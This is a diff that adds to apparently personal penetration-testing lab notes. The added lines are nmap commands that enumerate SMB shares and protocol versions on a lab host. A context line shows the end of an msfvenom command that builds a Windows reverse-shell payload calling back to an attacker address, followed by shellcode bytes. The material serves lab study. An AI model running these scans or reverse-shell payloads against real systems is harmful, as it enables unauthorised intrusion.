@@ -78,3 +78,39 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.129.48.82 LPORT=443 EXITFUNC=thre
 "\xb5\x10\x0e\x81\xd3\x67\xda\xac\xc0\x46\x4a\x13"
 ```
 
+```
+sudo nmap --script smb-enum-shares -p445 10.129.200.70
+```
+
+![[Pasted image 20231106171631.png]]
+
+```
+sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.129.200.70
+```
+
+![[Pasted image 20231106171716.png]]
+
+```
+sudo nmap -p139 --script smb-protocols 10.129.200.70
+```
+
+![[Pasted image 20231106172327.png]]
+
+```
+sudo nmap -p445 --script smb-protocols 10.129.200.70
+```
+
+![[Pasted image 20231106172402.png]]
+
+```
+NT LM 0.12 (SMBv1) [dangerous, but default]
+```
+
+```
+nmap --script=smb-protocols -p139,445 --open --reason -sV -Pn
+nmap --script=smb-protocols -p445 --open --reason -sV -Pn
+nmap --script=smb-protocols -p139 --open --reason -sV -Pn
+```
+
+![[Pasted image 20231106173003.png]]
+
